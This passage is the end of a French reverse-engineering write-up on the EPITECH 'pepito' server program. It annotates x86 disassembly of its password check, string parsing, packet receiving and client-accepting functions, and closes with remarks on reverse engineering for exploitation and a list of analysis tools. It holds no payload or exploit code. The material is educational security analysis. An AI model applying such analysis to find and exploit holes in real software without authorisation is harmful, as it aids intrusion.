+	   0x08048b96 <+18>:	movl   $0x804ac80,0x4(%esp)	      <= place l'@ de password sur la stack
+	   0x08048b9e <+26>:	mov    0x8(%ebp),%eax                 <= place le 1er argument (sentPassword) dans %eax
+	   0x08048ba1 <+29>:	mov    %eax,(%esp)		      <= place %eax sur la stack
+	   0x08048ba4 <+32>:	call   0x8048aa8 <strcmp@plt>         <= compare senPassword et password
+	   0x08048ba9 <+37>:	mov    %eax,-0xc(%ebp)                <= place le résultat de strcmp dans une variable qu'on nomme v1
+
+		== if (senPassword != password) ========================
+
+		   0x08048bac <+40>:	cmpl   $0x0,-0xc(%ebp)		     <= compare v1 à zero
+		   0x08048bb0 <+44>:	je     0x8048bbe <passwordCheck+58>  <= si == 0 go +58
+		   0x08048bb2 <+46>:	movl   $0x80496b0,(%esp)             <= sinon place "Wrong password\n" sur la stack pour sendLogMessage
+		   0x08048bb9 <+53>:	call   0x8049521 <sendLogMessage>
+
+		========================================================
+
+	   0x08048bbe <+58>:	mov    -0xc(%ebp),%eax                       <= sinon place v1 dans %eax (on return v1)
+	   0x08048bc1 <+61>:	jmp    0x8048bc8 <passwordCheck+68>          <= jmp +68
+
+	================================================================
+
+	   0x08048bc3 <+63>:	mov    $0x0,%eax	<= si password == 0 on return 0
+	   0x08048bc8 <+68>:	leave
+	   0x08048bc9 <+69>:	ret
+
+
+]=---------------------------------------------------------------------{  getStr
+
+
+	   0x08048fe4 <+6>:	movl   $0x0,-0xc(%ebp)		<= init un variable v1 à 0
+	   0x08048feb <+13>:	mov    0xc(%ebp),%eax		<= place le 2eme argument (l) dans %eax
+	   0x08048fee <+16>:	mov    %eax,0x4(%esp)		<= place %eax sur la stack
+	   0x08048ff2 <+20>:	mov    0x8(%ebp),%eax           <= place le 1er argument (p) dans %eax
+	   0x08048ff5 <+23>:	mov    %eax,(%esp)		<= place %eax sur la stack
+	   0x08048ff8 <+26>:	call   0x8048f8d <getNumber>
+
+	   0x08048ffd <+31>:	mov    %eax,-0x10(%ebp)		<= place le résultat de getNumber dans un variable v2
+	   0x08049000 <+34>:	cmpl   $0x0,-0x10(%ebp)		<= compare cette variable à 0
+
+
+	   0x08049004 <+38>:	jle    0x8049059 <getStr+123>   <= si getNumber < 0 jmp +123
+
+
+	== if (getNumber > 0) ==========================================
+
+	   0x08049006 <+40>:	mov    -0x10(%ebp),%eax		<= place v2 dans %eax
+	   0x08049009 <+43>:	add    $0x1,%eax		<= ajoute 1 à v2 sans l'influencer
+	   0x0804900c <+46>:	mov    %eax,(%esp)		<= place %eax sur la stack
+	   0x0804900f <+49>:	call   0x8048a48 <malloc@plt>	<= malloc de size v2
+	   0x08049014 <+54>:	mov    %eax,-0xc(%ebp)		<= place le résultat dans v1
+	   0x08049017 <+57>:	mov    -0x10(%ebp),%eax		<= place v2 dans %eax
+	   0x0804901a <+60>:	add    -0xc(%ebp),%eax		<= addition v2 a v1 sans l'influencer
+	   0x0804901d <+63>:	movb   $0x0,(%eax)		<= place 0 dans le contenu de %eax (donc '\0' à la dernière case)
+	   0x08049020 <+66>:	mov    -0x10(%ebp),%edx		<= place v2 dans %edx
+	   0x08049023 <+69>:	mov    0x8(%ebp),%eax		<= place 1er argument (p) dans %eax
+	   0x08049026 <+72>:	mov    (%eax),%eax		<= place le contenu de p dans %eax
+	   0x08049028 <+74>:	mov    %edx,0x8(%esp)		<= place %edx (v2) sur la stack
+	   0x0804902c <+78>:	mov    %eax,0x4(%esp)		<= place %eax (p) sur la stack
+	   0x08049030 <+82>:	mov    -0xc(%ebp),%eax		<= place v1 dans %eax
+	   0x08049033 <+85>:	mov    %eax,(%esp)		<= place %eax (v1) sur la stack
+	   0x08049036 <+88>:	call   0x8048908 <strncpy@plt>
+	   0x0804903b <+93>:	mov    0x8(%ebp),%eax		<= place le 1er argument (p) dans %eax
+	   0x0804903e <+96>:	mov    (%eax),%edx		<= place le contenu de %eax dans %edx
+	   0x08049040 <+98>:	mov    -0x10(%ebp),%eax		<= place v2 dans %eax
+	   0x08049043 <+101>:	add    %eax,%edx		<= addition v2 à p
+	   0x08049045 <+103>:	mov    0x8(%ebp),%eax		<= place p dans %eax
+	   0x08049048 <+106>:	mov    %edx,(%eax)		<= place p dans l'adresse du nouveau p
+	   0x0804904a <+108>:	mov    0xc(%ebp),%eax		<= place 2eme argument (l) dans %eax
+	   0x0804904d <+111>:	mov    (%eax),%edx		<= place le contenu de %eax dans %edx
+	   0x0804904f <+113>:	mov    -0x10(%ebp),%eax		<= place v2 dans %eax
+	   0x08049052 <+116>:	sub    %eax,%edx		<= soustrait v2 à l
+	   0x08049054 <+118>:	mov    0xc(%ebp),%eax		<= place 2eme argument (l) dans %eax
+	   0x08049057 <+121>:	mov    %edx,(%eax)		<= place l dans nouveau l
+
+	================================================================
+
+	   0x08049059 <+123>:	mov    -0xc(%ebp),%eax		<= return v2
+	   0x0804905c <+126>:	leave
+	   0x0804905d <+127>:	ret
+
+
+]=------------------------------------------------------------------{  getPacket
+
+
+	   0x080494cb <+7>:	mov    0xc(%ebp),%ebx		<= place le 2eme argument (packetSize) dans %ebx
+	   0x080494ce <+10>:	mov    0x804ae98,%eax		<= place l'@ de client dans %eax
+							   	   0x804ae98 <client>:	0xffffffff
+	   0x080494d3 <+15>:	movl   $0x0,0xc(%esp)	 	<= place 0 sur la stack
+	   0x080494db <+23>:	movl   $0x1000,0x8(%esp) 	<= place 4096 sur la stack
+	   0x080494e3 <+31>:	mov    0x8(%ebp),%edx    	<= place 1er argument dans %edx
+	   0x080494e6 <+34>:	mov    %edx,0x4(%esp)    	<= puis le place sur la stack
+	   0x080494ea <+38>:	mov    %eax,(%esp)       	<= place l'@ de client sur la stack
+	   0x080494ed <+41>:	call   0x80488e8 <recv@plt>
+	   0x080494f2 <+46>:	mov    %eax,(%ebx)              <= place le résultat de recv dans packetSize
+	   0x080494f4 <+48>:	mov    (%ebx),%eax		<= place le contenu de packetSize dans %eax
+	   0x080494f6 <+50>:	test   %eax,%eax                <= test si %eax = 0
+
+
+	== if (recv() < 0) =============================================
+
+	   0x080494f8 <+52>:	jns    0x8049506 <getPacket+66>
+	   0x080494fa <+54>:	movl   $0x80498b3,(%esp)        <= place "recv()" sur la stack
+	   0x08049501 <+61>:	call   0x8048f40 <die>
+
+        ================================================================
+
+	   0x08049506 <+66>:	mov    0xc(%ebp),%eax           <= place 2eme argument dans %eax
+	   0x08049509 <+69>:	mov    (%eax),%eax              <= place *packetSize dans %eax
+	   0x0804950b <+71>:	test   %eax,%eax                <= si packetSize = 0
+
+	== if (*packetSize == 0) =======================================
+
+	   0x0804950d <+73>:	je     0x8049516 <getPacket+82>
+	   0x0804950f <+75>:	mov    $0x1,%eax                   <= si = 0 on place 1 dans %eax puis return
+	   0x08049514 <+80>:	jmp    0x804951b <getPacket+87>    <= jump return
+
+        ================================================================
+
+	   0x08049516 <+82>:	mov    $0x0,%eax        <= sinon on place 0 dans %eax
+	   0x0804951b <+87>:	add    $0x14,%esp       <= épilogue
+	   0x0804951e <+90>:	pop    %ebx		<= épilogue
+	   0x0804951f <+91>:	pop    %ebp		<= épilogue
+	   0x08049520 <+92>:	ret			<= return 0
+
+
+]=---------------------------------------------------------------{  acceptClient
+
+
+	   0x08049488 <+6>:	movl   $0x10,-0x10(%ebp)   	<= init une variable à 16 (WTF) v1
+	   0x0804948f <+13>:	mov    0x8(%ebp),%edx	   	<= place arg1 (sa) dans %edx
+	   0x08049492 <+16>:	mov    0x804ae94,%eax	   	<= place l'@ de sockFd dans %eax
+							      	   0x804ae94 <sockFd>: 0xffffffff
+	   0x08049497 <+21>:	lea    -0x10(%ebp),%ecx    	<= place v1 dans %ecx
+	   0x0804949a <+24>:	mov    %ecx,0x8(%esp)	   	<= place %edx (v1) sur la stack
+	   0x0804949e <+28>:	mov    %edx,0x4(%esp)		<= place %edx (sa) sut la stack
+	   0x080494a2 <+32>:	mov    %eax,(%esp)              <= place l'@ de sockFd sur la stack
+	   0x080494a5 <+35>:	call   0x8048988 <accept@plt>
+	   0x080494aa <+40>:	mov    %eax,-0xc(%ebp)          <= place le résultat de accept dans une variable v2
+	   0x080494ad <+43>:	cmpl   $0x0,-0xc(%ebp)          <= compare v2 à zero
+
+	   0x080494b1 <+47>:	jns    0x80494bf <acceptClient+61>
+
+	== if (accept() == 0) ==========================================
+
+	   0x080494b3 <+49>:	movl   $0x80498aa,(%esp) 	<= place "accept()" sur la stack
+	   0x080494ba <+56>:	call   0x8048f40 <die>
+
+	================================================================
+
+	   0x080494bf <+61>:	mov    -0xc(%ebp),%eax		<= sinon return v2
+	   0x080494c2 <+64>:	leave
+	   0x080494c3 <+65>:	ret
+
+
+]=-----------------------------------------------------------------{  Conclusion
+
+Le Reverse Engineering est devenu un atout majeur dans l'exploitation d'applications,
+bien que dans ce projet "pepito", les étudiants d'EPITECH ont accès aux sources du
+programme, mais cela n'est pas toujours le cas des logiciels mis à disposition sur
+internet.
+
+C'est pourquoi le Reverse vous permet de vous faire une idée sur l'infrastructure du
+programme et comprendre son fonctionnement.
+
+
+Outil utils:
+------------
+		- gdb
+		- nm
+		- objdump
+		- hte
+		- IDA pro
+
+
+
+
+                         Jonathan Salwan
+			 shell-storm.org
+			 8888888888 8888888 888b    888      888
+			 888      p   888   8888b   888      888
+			 888      e 2 888   88888b  888      888
+			 8888888  p 0 888   888Y88b 888      888
+			 888      i 1 888   888 Y88b888      888
+			 888      t 1 888   888  Y88888      888
+			 888      o   888   888   Y8888
+			 888        8888888 888    Y888      888
+
+
+
